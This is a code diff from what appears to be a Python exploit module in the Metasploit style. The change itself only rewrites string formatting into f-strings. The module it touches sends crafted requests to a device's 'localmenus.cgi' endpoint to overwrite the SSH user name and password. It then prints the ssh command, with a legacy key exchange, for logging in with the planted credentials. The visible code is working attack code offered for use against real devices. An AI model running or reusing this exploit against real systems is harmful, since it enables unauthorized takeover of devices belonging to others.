@@ -58,13 +58,13 @@ metadata = {
 
 
 def run(args):
-    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
+    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")
     if dependency_missing:
         logging.error('Python module dependency (requests) is missing, cannot continue')
         logging.error('Please execute pip3 install requests.')
         return
 
-    url = "http://{}/localmenus.cgi".format(args['rhost'])
+    url = f"http://{args['rhost']}/localmenus.cgi"
     payload_user = {"func": "403", "set": "401",
                     "name1": args['USER'], "name2": args['USER']}
     payload_pass = {"func": "403", "set": "402",
@@ -86,10 +86,15 @@ def run(args):
         return
 
     logging.info("SSH attack finished!")
-    logging.info(("Try to login using the supplied credentials {}:{}").format(
-        args['USER'], args['PASS']))
+    logging.info(
+        f"Try to login using the supplied credentials {args['USER']}:{args['PASS']}"
+    )
+
     logging.info("You must specify the key exchange when connecting or the device will be DoS'd!")
-    logging.info(("ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 {}@{}").format(args['USER'], args['rhost']))
+    logging.info(
+        f"ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 {args['USER']}@{args['rhost']}"
+    )
+
     return
 
 
